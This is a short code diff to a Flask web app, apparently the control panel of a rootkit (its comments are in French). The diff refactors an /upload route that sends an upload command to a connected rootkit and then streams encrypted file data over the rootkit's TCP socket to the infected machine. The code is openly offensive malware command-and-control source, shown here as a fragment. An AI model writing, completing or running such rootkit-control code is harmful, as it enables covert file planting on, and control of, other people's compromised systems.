@@ -3,7 +3,6 @@ import config as cfg
 from flask import flash, render_template, redirect, url_for, request, session
 from werkzeug.utils import secure_filename
 import os
-from utils.server import TCPServer
 
 @app.route('/upload', methods=['GET', 'POST'])
 def upload():
@@ -30,7 +29,7 @@ def upload():
             # 1. Envoie la commande au rootkit
             size = len(file_data)
             command = f"upload {remote_path} {size}"
-            response = cfg.rootkit_connexion.send_to_client(command)
+            response = cfg.rootkit_connexion.send(command, use_history=False, channel="tcp")
 
             if response is None:
                 flash("Aucune réponse du rootkit.", "error")
@@ -43,8 +42,8 @@ def upload():
             flash(f"✅ Rootkit prêt pour l'upload vers {remote_path}", "success")
 
             # 2. Envoi binaire chiffré du fichier
-            success = cfg.rootkit_connexion._network_handler.send(
-                cfg.rootkit_connexion._client_socket,
+            success = cfg.rootkit_connexion.get_tcp_object()._network_handler.send(
+                cfg.rootkit_connexion.get_tcp_object()._client_socket,
                 file_data
             )
 
